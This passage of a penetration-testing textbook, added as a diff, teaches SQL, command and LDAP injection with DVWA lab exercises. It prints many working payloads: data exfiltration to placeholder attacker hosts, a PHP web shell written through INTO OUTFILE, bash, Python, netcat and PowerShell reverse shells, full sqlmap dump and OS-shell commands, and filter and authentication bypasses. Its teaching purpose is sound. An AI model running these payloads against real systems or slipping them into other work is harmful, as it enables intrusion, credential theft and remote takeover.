+- The database server has outbound internet access
+
+```sql
+-- MySQL: Extract database name via DNS lookup
+-- The database name is embedded in a DNS query to attacker's domain
+' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker-collaborator.com\\share'))--
+
+-- Microsoft SQL Server: DNS exfiltration
+'; exec master..xp_dirtree CONCAT('\\\\', (SELECT DB_NAME()), '.attacker-collaborator.com\\a')--
+
+-- Oracle: HTTP exfiltration  
+' UNION SELECT UTL_HTTP.request('http://attacker-collaborator.com/'||(SELECT user FROM dual)) FROM dual--
+```
+
+The attacker monitors their DNS server or Burp Suite's Collaborator service for incoming queries. When the DNS query `webshop.attacker-collaborator.com` arrives, the subdomain `webshop` reveals the database name.
+
+#### Beyond Data Extraction — Reading and Writing Files
+
+Some SQL injection vulnerabilities provide capabilities far beyond data reading. MySQL's `LOAD_FILE()` and `INTO OUTFILE` functions allow reading and writing the filesystem — when the database user has the required privileges.
+
+```sql
+-- Read a file from the server filesystem (requires FILE privilege):
+' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--
+-- Returns the contents of /etc/passwd if accessible by the MySQL user
+
+-- Write a web shell to the server (requires FILE privilege and write access to web root):
+' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php'--
+-- Creates a PHP web shell at /shell.php
+-- Access: http://target.com/shell.php?cmd=id
+```
+
+If successful, file writing via SQL injection results in remote code execution — the most severe possible outcome. Whether this is possible depends on:
+- The MySQL user having `FILE` privilege
+- The `secure_file_priv` variable being configured to allow writes
+- The MySQL user having write permission on the web root directory
+
+#### Identifying SQL Injection — The Detection Methodology
+
+Before exploiting, you must identify which parameters are injectable. The process is systematic:
+
+**Step 1: Find all input points**
+
+Every place the application accepts user input is a potential injection point:
+- URL parameters: `?category=phones&sort=price`
+- POST body parameters: form fields, JSON values, XML elements
+- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Cookie`, `Referer` (less common but real)
+- JSON body fields in REST APIs
+- GraphQL query parameters
+
+**Step 2: Send detection payloads**
+
+For each input parameter, send payloads that would cause a detectable change if the parameter is used in a SQL query:
+
+```
+# Single quote — causes SQL syntax error if vulnerable
+'
+
+# Double quote — for double-quoted strings  
+"
+
+# Comment sequences — truncate query if vulnerable
+--
+#
+/*
+
+# Boolean conditions — change page content if vulnerable
+' AND '1'='1       (always true — should return normal results)
+' AND '1'='2       (always false — should return empty/different results)
+
+# Numeric comparison (for numeric parameters)
+1 AND 1=1          (true)
+1 AND 1=2          (false)
+
+# Time-based detection (when no visible difference)
+'; SELECT SLEEP(5);--    (MySQL)
+'; WAITFOR DELAY '0:0:5'--  (MSSQL)
+```
+
+**Step 3: Observe and compare responses**
+
+Three types of evidence indicate SQL injection:
+- **Error messages:** "You have an error in your SQL syntax..." — definitive SQL injection
+- **Different responses:** Normal page for true condition, empty page or error for false condition — boolean blind
+- **Time delays:** Response takes exactly 5 seconds for SLEEP(5) payload — time-based blind
+
+**Step 4: Identify the database type**
+
+Different databases have different syntax. Identifying the database type early allows using the correct payloads:
+
+```sql
+-- Version query varies by database:
+MySQL:     SELECT version()          -- returns "8.0.33"
+MSSQL:     SELECT @@version          -- returns "Microsoft SQL Server..."
+Oracle:    SELECT v$version FROM DUAL
+PostgreSQL: SELECT version()
+
+-- Comment syntax varies:
+MySQL:     --  or #
+MSSQL:     --  (space required after --)
+Oracle:    --
+PostgreSQL: --
+```
+
+#### SQLmap — Automated SQL Injection
+
+SQLmap is the standard automated tool for SQL injection detection and exploitation. It implements all SQL injection types, automatically detects the database type, and can extract the entire database with a single command.
+
+```bash
+# Basic test — check if a URL parameter is injectable
+sqlmap -u "http://target.com/products?id=1"
+
+# Test a specific parameter
+sqlmap -u "http://target.com/search?q=phones&category=all" -p q
+
+# Test a POST request (save request from Burp as a file first)
+sqlmap -r burp_request.txt
+
+# Test POST with specific parameter
+sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username
+
+# Include cookie for authenticated testing
+sqlmap -u "http://target.com/account?id=1" --cookie="session=7f3a9b2c"
+
+# Use with Burp proxy (to see sqlmap's requests in Burp)
+sqlmap -u "http://target.com/products?id=1" --proxy=http://127.0.0.1:8080
+
+# Enumerate databases
+sqlmap -u "http://target.com/products?id=1" --dbs
+
+# Enumerate tables in a specific database
+sqlmap -u "http://target.com/products?id=1" -D webshop --tables
+
+# Enumerate columns in a specific table
+sqlmap -u "http://target.com/products?id=1" -D webshop -T users --columns
+
+# Dump all data from a table
+sqlmap -u "http://target.com/products?id=1" -D webshop -T users --dump
+
+# Dump everything (all databases)
+sqlmap -u "http://target.com/products?id=1" --dump-all
+
+# Test for file read/write capabilities
+sqlmap -u "http://target.com/products?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://target.com/products?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Attempt OS shell (if FILE privilege and write access available)
+sqlmap -u "http://target.com/products?id=1" --os-shell
+
+# Stealth options (slower but less detectable)
+sqlmap -u "http://target.com/products?id=1" --dbs --level=3 --risk=2 --delay=2
+
+# Specify database type for faster exploitation
+sqlmap -u "http://target.com/products?id=1" --dbms=mysql --dbs
+```
+
+**SQLmap options explained:**
+
+`--level` (1-5): Controls how many tests are run. Level 1 tests the most common parameters. Level 5 tests everything including HTTP headers.
+
+`--risk` (1-3): Controls how potentially disruptive the tests are. Risk 1 is safe for production. Risk 3 includes UPDATE-based tests that could modify data.
+
+`--delay`: Seconds to wait between requests. Reduces speed but avoids rate limiting and IDS detection.
+
+`--tamper`: Apply tamper scripts to obfuscate payloads and bypass WAFs. For example `--tamper=space2comment` replaces spaces with comments to bypass simple keyword filters.
+
+`--technique`: Restrict to specific injection types (B=Boolean, E=Error, U=UNION, S=Stacked, T=Time, Q=Out-of-band).
+
+#### SQL Injection Filter Bypass Techniques
+
+Real applications often have input validation, WAFs, or other defenses. These are bypassable in most cases.
+
+```sql
+-- Bypassing keyword filters that block 'SELECT' 'UNION' etc:
+
+-- Case variation (SQL is case-insensitive):
+SeLeCt, UnIoN, sElEcT
+
+-- Comment insertion (MySQL ignores /**/ comments inline):
+UN/**/ION SEL/**/ECT
+
+-- Double URL encoding (%27 = ', %2527 = %27 after server decodes):
+%2527 → first decode: %27 → second decode: '
+
+-- MySQL allows inline comments with version hints:
+/*!UNION*/ /*!SELECT*/
+
+-- Hex encoding strings to avoid quote filtering:
+-- Instead of 'users', use 0x7573657273 (hex for 'users')
+' UNION SELECT 0x7573657273--
+
+-- Whitespace alternatives (MySQL treats these as whitespace):
+Tab: %09
+Newline: %0a  
+Carriage return: %0d
+Form feed: %0c
+Vertical tab: %0b
+
+-- Plus signs for spaces in URL contexts:
+' UNION+SELECT+NULL--
+
+-- Bypassing OR/AND filters using && and ||:
+' || 1=1--        (equivalent to OR)
+' && 1=1--        (equivalent to AND)
+```
+
+---
+
+### 6.4.3 Practice — SQL Injection Attacks Step by Step
+
+#### Manual SQL Injection Against DVWA
+
+With DVWA running (security level: Low), navigate to the SQL Injection module. The page shows a field labeled "User ID" that queries the users table and displays the user's details.
+
+**Phase 1 — Confirm Injection**
+
+Enter `1'` (one followed by a single quote). The application returns a MySQL error. This confirms the input is being concatenated directly into a SQL query.
+
+**Phase 2 — Determine Column Count**
+
+Enter `1 ORDER BY 1--` — displays result normally.
+Enter `1 ORDER BY 2--` — displays result normally.
+Enter `1 ORDER BY 3--` — shows error "Unknown column '3' in order clause."
+
+The original query has exactly 2 columns.
+
+**Phase 3 — Identify Display Columns**
+
+Enter `' UNION SELECT NULL, NULL--` — no error, confirms 2 columns. Now identify which ones display on the page:
+
+Enter `' UNION SELECT 'COLUMN1_TEST', NULL--` — observe if "COLUMN1_TEST" appears in the response.
+Enter `' UNION SELECT NULL, 'COLUMN2_TEST'--` — observe if "COLUMN2_TEST" appears.
+
+Both columns are displayed in DVWA's output (First Name and Surname fields).
+
+**Phase 4 — Extract Database Information**
+
+```sql
+-- Database version:
+' UNION SELECT NULL, version()--
+
+-- Current database name:
+' UNION SELECT NULL, database()--
+
+-- MySQL user (shows privilege level):
+' UNION SELECT NULL, user()--
+
+-- List all databases:
+' UNION SELECT NULL, schema_name FROM information_schema.schemata--
+
+-- List all tables in current database (dvwa):
+' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dvwa'--
+
+-- List columns in users table:
+' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
+
+-- Extract all usernames and passwords:
+' UNION SELECT user, password FROM users--
+```
+
+The password field in DVWA contains MD5 hashes. After extracting them, crack with hashcat:
+```bash
+hashcat -m 0 dvwa_hashes.txt /usr/share/wordlists/rockyou.txt
+# Most DVWA passwords crack quickly: admin:password, gordonb:abc123, etc.
+```
+
+#### Using SQLmap Against DVWA
+
+After confirming the injection manually, use sqlmap for automated extraction:
+
+```bash
+# In DVWA, get your session cookie from Burp or browser DevTools
+# (look for PHPSESSID in the Application tab → Cookies)
+
+# Run sqlmap with your session cookie:
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=your_session_id; security=low" \
+  --dbs
+
+# Dump the users table:
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=your_session_id; security=low" \
+  -D dvwa -T users --dump
+```
+
+#### Progressing Through Security Levels
+
+Once you have mastered Low, change DVWA's security level to Medium. The application now uses parameterized queries on some inputs but sanitizes in ways that are bypassable. Read the source code (available via the "View Source" button in DVWA) to understand what defense is applied and how to bypass it.
+
+High level adds additional server-side filtering. Each level teaches you something new about defense implementation and bypass methodology.
+
+---
+
+### 6.4.4 Command Injection Vulnerabilities
+
+#### The Concept — When the Server Runs Your Commands
+
+Command injection occurs when user-controlled input is passed to an operating system command execution function without proper sanitization. The application builds a shell command by concatenating user input, and the operating system shell then executes the entire string — user input and all.
+
+The shell interprets special characters as command separators, allowing multiple commands to be executed in sequence. Common shell metacharacters:
+
+| Character | Behavior | Example |
+|-----------|----------|---------|
+| `;` | Execute next command unconditionally | `ping host; id` |
+| `&&` | Execute next command only if first succeeds | `ping host && id` |
+| `\|\|` | Execute next command only if first fails | `badcmd \|\| id` |
+| `\|` | Pipe output of first command to second | `ls \| grep passwd` |
+| `` ` `` | Execute and substitute output (backticks) | `echo \`id\`` |
+| `$(...)` | Execute and substitute output | `echo $(id)` |
+| `>` | Redirect output to file | `id > /tmp/out.txt` |
+| `<` | Read input from file | `mail < /etc/passwd` |
+| `&` | Run command in background | `payload &` |
+| `\n` | Newline — new command | `cmd\nid` |
+
+#### Vulnerable Code Examples — Recognizing the Pattern
+
+Command injection happens when developers use shell execution functions with unsanitized user input. Recognizing these patterns in source code is how you identify injection points during code review.
+
+**PHP:**
+```php
+// VULNERABLE — user input directly in shell command
+$hostname = $_GET['host'];
+$output = shell_exec("ping -c 3 $hostname");
+
+// Also vulnerable:
+system("nslookup $hostname");
+exec("traceroute $hostname");
+passthru("nmap $hostname");
+popen("dig $hostname", 'r');
+
+// SECURE — use escapeshellarg() to prevent injection:
+$hostname = escapeshellarg($_GET['host']);
+$output = shell_exec("ping -c 3 $hostname");
+```
+
+**Python:**
+```python
+# VULNERABLE
+import os
+hostname = request.form['host']
+output = os.system(f"ping -c 3 {hostname}")
+
+# Also vulnerable:
+subprocess.call(f"nmap {hostname}", shell=True)  # shell=True is the problem
+
+# SECURE — use subprocess with list argument (no shell interpretation):
+subprocess.call(["nmap", hostname])  # shell=False (default) — no injection possible
+```
+
+**Node.js:**
+```javascript
+// VULNERABLE
+const { exec } = require('child_process');
+exec(`ping -c 3 ${req.body.host}`, (err, stdout) => { ... });
+
+// SECURE — use spawn with argument list:
+const { spawn } = require('child_process');
+spawn('ping', ['-c', '3', req.body.host]);
+```
+
+#### Finding Command Injection Points
+
+Look for any feature that suggests a system-level operation happening based on user input:
+
+- **Network diagnostics:** "Ping this host", "Traceroute this IP", "DNS lookup", "Port check"
+- **File operations:** Converting uploaded files, generating PDFs from user content, image resizing
+- **Email functionality:** Sending emails using system mail utilities
+- **System administration UI:** Server management panels, cPanel, WHM
+- **Logging and monitoring:** Log analysis tools that run system commands with user-supplied filters
+- **API gateways:** Proxy functionality that executes commands based on API calls
+
+When you find such functionality, the detection methodology is to inject command separators and observe the response.
+
+#### Basic Injection Payloads
+
+```bash
+# On Linux/Unix — injection with semicolon:
+; id
+; whoami
+; uname -a
+; cat /etc/passwd
+
+# On Windows — injection with ampersand:
+& whoami
+& ipconfig /all
+& type C:\Windows\System32\drivers\etc\hosts
+
+# On both platforms — injection with pipe:
+| id
+| whoami
+
+# Newline injection (useful when semicolon is filtered):
+%0a id        # URL-encoded newline
+%0a whoami
+
+# Subshell injection:
+$(id)
+`id`
+
+# If spaces are filtered — use ${IFS} (Internal Field Separator):
+;cat${IFS}/etc/passwd
+;id${IFS}
+```
+
+#### Blind Command Injection — When No Output Is Returned
+
+The most common form of command injection is blind — the application executes your command but does not display the output in the response. Detection and exploitation require different techniques.
+
+**Detection using time delays:**
+
+```bash
+# Linux: sleep for 5 seconds — if response takes 5+ seconds, injection confirmed
+; sleep 5
+| sleep 5
+$(sleep 5)
+`sleep 5`
+
+# Windows: ping loopback 5 times (each ping ~1 second = 5 second delay)
+& ping -n 5 127.0.0.1
+```
+
+**Data exfiltration using out-of-band channels:**
+
+When you cannot see command output, use the server's network connectivity to send data to yourself:
+
+```bash
+# HTTP callback — send command output to your server via curl:
+; curl http://attacker-ip:4444/$(id)
+; curl -X POST http://attacker-ip:4444/ -d "$(cat /etc/passwd)"
+; wget http://attacker-ip:4444/?data=$(whoami)
+
+# DNS exfiltration — embed output in DNS lookup:
+; nslookup $(whoami).attacker-domain.com
+; host $(cat /etc/hostname).attacker-domain.com
+
+# Set up a listener on your attack machine:
+# Terminal 1 — HTTP listener:
+python3 -m http.server 4444
+# or
+nc -lvnp 4444
+
+# Terminal 2 — Watch for incoming requests/connections
+```
+
+Use Burp Suite's Collaborator (Burp → Burp Collaborator client → Copy to clipboard) to get a unique URL/domain that records all DNS queries and HTTP requests made to it. This is more reliable than your own server for detecting out-of-band callbacks.
+
+**Writing command output to a readable file:**
+
+If the injection is in a web application and the web root is writable:
+
+```bash
+# Write output to a file accessible via HTTP:
+; id > /var/www/html/output.txt
+; cat /etc/passwd > /var/www/html/passwd.txt
+
+# Then read it:
+# http://target.com/output.txt
+# http://target.com/passwd.txt
+```
+
+#### Escalating to a Reverse Shell
+
+Command injection typically provides blind RCE (Remote Code Execution). To get an interactive session, escalate to a reverse shell:
+
+**Step 1: Set up your listener on the attack machine**
+```bash
+# On Kali Linux:
+nc -lvnp 4444
+# or for more stability:
+nc -lvnp 4444
+# or with rlwrap for arrow keys and history:
+rlwrap nc -lvnp 4444
+```
+
+**Step 2: Inject the reverse shell payload**
+
+```bash
+# Bash reverse shell (most reliable on Linux):
+; bash -i >& /dev/tcp/attacker-ip/4444 0>&1
+
+# URL-encoded version (for injection via URL parameter):
+; bash+-i+>%26+/dev/tcp/attacker-ip/4444+0>%261
+
+# Python reverse shell (works when bash is unavailable):
+; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat reverse shell (if nc is available on target):
+; nc attacker-ip 4444 -e /bin/bash
+
+# PowerShell reverse shell (Windows targets):
+& powershell -c "$c=New-Object Net.Sockets.TCPClient('attacker-ip',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($r,0,$r.Length)}"
+```
+
+**Upgrading a netcat shell to a fully interactive TTY:**
+```bash
+# After getting a shell via nc:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then: Ctrl+Z to background
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm
+```
+
+---
+
+### 6.4.5 Practice — Command Injection Step by Step
+
+#### Testing on DVWA
+
+Navigate to DVWA → Command Injection. The page has a field asking for a hostname to ping. Enter `127.0.0.1` — the application returns the output of a ping command.
+
+**Confirm injection:**
+Enter `127.0.0.1; id` in the ping field. If command injection is present at Low security, the page displays the ping output followed by the `id` command output (e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)`).
+
+**Information gathering:**
+```
+127.0.0.1; uname -a          # Kernel version and OS
+127.0.0.1; cat /etc/passwd   # User accounts
+127.0.0.1; whoami            # Current user
+127.0.0.1; pwd               # Current working directory
+127.0.0.1; ls -la /var/www   # Web root contents
+127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php  # Database credentials!
+```
+
+The config file discovery is particularly impactful — it contains the database credentials in plaintext, which can then be used for direct MySQL access.
+
+**Medium security bypass:**
+DVWA's Medium level filters `&&` and `;` but allows pipes and other separators:
+```
+127.0.0.1 | id
+127.0.0.1 || id    # Pipe followed by second pipe — different character
+127.0.0.1 & id
+```
+
+Check DVWA's source code to see exactly what is filtered, then find the gap.
+
+---
+
+### 6.4.6 LDAP Injection Vulnerabilities
+
+#### What LDAP Is — Essential Context
+
+LDAP (Lightweight Directory Access Protocol) is a protocol for accessing and maintaining distributed directory services — structured databases of hierarchical information. In corporate environments, LDAP is primarily used to provide Active Directory (AD) authentication. When you log in to a Windows domain or an enterprise application with your corporate credentials, LDAP is almost certainly involved somewhere in the authentication process.
+
+LDAP stores information in a tree structure. Each entry has a Distinguished Name (DN) that describes its position in the tree:
+
+```
+CN=John Smith,OU=Engineering,DC=targetco,DC=com
+```
+
+- `CN` — Common Name (the object's name)
+- `OU` — Organizational Unit (like a folder/department)
+- `DC` — Domain Component (the domain name split into components)
+
+LDAP queries use a filter syntax that specifies what to search for:
+
+```
+(objectClass=person)                        -- All persons
+(uid=jsmith)                               -- User with uid=jsmith
+(&(uid=jsmith)(userPassword=mypassword))   -- User with matching uid AND password
+(|(department=Engineering)(department=IT)) -- Engineering OR IT department members
+```
+
+The `&` means AND (all conditions must match), `|` means OR (any condition must match), `!` means NOT.
+
+#### The Injection Mechanism
+
+Web applications that authenticate against LDAP build query filters by concatenating user input — the same mistake made in SQL injection, applied to LDAP.
+
+```php
+// VULNERABLE PHP code for LDAP authentication
+$username = $_POST['username'];
+$password = $_POST['password'];
+$filter = "(&(uid=$username)(userPassword=$password))";
+$result = ldap_search($connection, "dc=targetco,dc=com", $filter);
+```
+
+When legitimate credentials are submitted:
+```
+Filter: (&(uid=alice)(userPassword=correct_password))
+Result: finds alice's entry → authentication success
+```
+
+When an attacker submits `*)(uid=*))(|(uid=*` as the username:
+```
+Filter: (&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
+```
+
+This LDAP filter, despite its complexity, evaluates to "return any user where uid is anything" — bypassing the password check entirely. The attacker is authenticated as the first user returned.
+
+#### Common LDAP Injection Payloads
+
+```
+# Authentication bypass — log in as any user:
+Username: *)(&
+Password: (anything)
+-- Creates: (&(uid=*)(&)(userPassword=(anything)))
+-- The (*) matches everything, (&) is always true
+
+# Classic auth bypass:
+Username: *)(|(password=*)
+Password: ignored
+-- Creates: (&(uid=*)(|(password=*))(userPassword=ignored))
+
+# Extract all users (information disclosure):
+Username: *
+-- If wildcard causes return of all matching entries, usernames are disclosed
+
+# Extract specific user:
+Username: admin
+-- Confirm admin exists by observing different response versus non-existent user
+
+# Blind injection — true/false conditions:
+Username: admin)(uid=*
+-- Different response if true (admin exists) versus false
+
+# Bypass input validation that filters *:
+# Use LDAP attribute matching: (uid=a*) matches users starting with 'a'
+```
+
+#### Blind LDAP Injection — Character-by-Character Extraction
+
+When LDAP injection is blind (different response for true/false but no data returned), information can be extracted character by character using wildcard patterns:
+
+```
+# Check if first character of admin's password is 'a':
+Username: admin)(userPassword=a*
+-- Different response than:
+Username: admin)(userPassword=b*
+
+# Systematically determine the password:
+Username: admin)(userPassword=a*    → false (no match)
+Username: admin)(userPassword=P*    → true (password starts with P)
+Username: admin)(userPassword=Pa*   → false
+Username: admin)(userPassword=Pp*   → false
+Username: admin)(userPassword=Pa*... → iterate through characters
+
+# This eventually reconstructs the entire password
+```
+
+This is slow but effective against vulnerable LDAP implementations that store passwords in retrievable form (some do, many do not).
+
+#### Special LDAP Characters to Inject
+
+The characters with special meaning in LDAP filter syntax:
+
+```
+( ) * \ NUL      ← characters requiring escape in valid LDAP
+& | !            ← logical operators
+=                ← attribute comparison operator
+```
+
+If the application does not escape these characters in user input, all of them can be used to manipulate the filter.
+
+#### LDAP Injection vs. SQL Injection — Key Differences
+
+| Aspect | SQL Injection | LDAP Injection |
+|--------|--------------|----------------|
+| Comment syntax | `--`, `#`, `/**/` | None standard |
+| Data structure | Tables/rows | Tree/attributes |
+| Authentication bypass | `' OR 1=1--` | `*)(uid=*))(|(uid=*` |
+| Data extraction | UNION SELECT | Wildcard enumeration |
+| Automation tooling | sqlmap (excellent) | Limited automation |
+| Prevalence | Very common | Less common |
+| Defenses | Parameterized queries | Escape all special chars |
+
+The fix for LDAP injection is proper input escaping before building filter strings. All special characters (`(`, `)`, `*`, `\`, null bytes) must be escaped as their LDAP escape sequences. In PHP, `ldap_escape()` (PHP 5.6+) provides this. In other languages, use the appropriate escaping function from your LDAP library.
+
+---
+
+### 6.4.7 Lab — Injection Attacks
+
+This lab section consolidates the injection concepts into a structured practice session using DVWA and WebSploit Labs.
+
+#### DVWA — Complete Injection Practice Sequence
+
+**SQL Injection (all three levels):**
+
+Low: Complete the UNION-based extraction sequence from 6.4.3. Extract all usernames, passwords, and emails. Crack the password hashes with hashcat.
+
+Medium: Read the source code. Notice that the application uses a dropdown instead of a text field, preventing direct submission of SQL characters. But you can bypass this by intercepting the request in Burp Suite and modifying the parameter directly in the proxy — client-side controls mean nothing at the server level.
+
+High: Read the source code again. Notice the query uses `LIMIT 1` to return only one result. Bypass this by terminating the original query early and crafting a subquery that circumvents the limit.
+
+**SQL Injection (Blind):**
+
+DVWA's blind SQL injection module shows no query results — just "User ID exists" or "User ID missing." Practice boolean-based extraction to determine the administrator's password length and first three characters manually, then run sqlmap with `--technique=B` to automate the complete extraction.
+
+**Command Injection (all three levels):**
+
+Low: Demonstrate the full chain — detect injection, enumerate system information, extract config file credentials, establish a reverse shell.
+
+Medium: Bypass the character filter (`,`, `&&`, `;` are blocked). Use pipe characters and URL-encoded newlines.
+
+High: The High level uses a strict allowlist — only valid IP address format is accepted. Research and find the bypass for this specific DVWA implementation. (Hint: some allowlist implementations have regex edge cases.)
+
+#### Key Takeaways from This Lab
+
+After completing these exercises, you should be able to:
+
+1. Identify injection points in any web application by recognizing input parameters and testing with detection payloads
+2. Distinguish between error-based, UNION-based, boolean blind, and time-based SQL injection and know when to use each
+3. Understand the complete UNION-based data extraction sequence from scratch without automated tools
+4. Recognize command injection opportunities from application features that suggest system-level operations
+5. Extract data from blind injection vulnerabilities using time delays and out-of-band callbacks
+6. Explain LDAP injection to a technical audience and describe its filter manipulation mechanism
+7. Use sqlmap for automated exploitation while understanding what it is doing under the hood
+
+These skills form the foundation for the exploitation phases in professional web application penetration tests. Every injection technique here appears in real assessments, in bug bounty programs, and in certification exams.
+
+---
+
+*— Sections 6.2, 6.3, and 6.4 are complete.  —*
+
+---
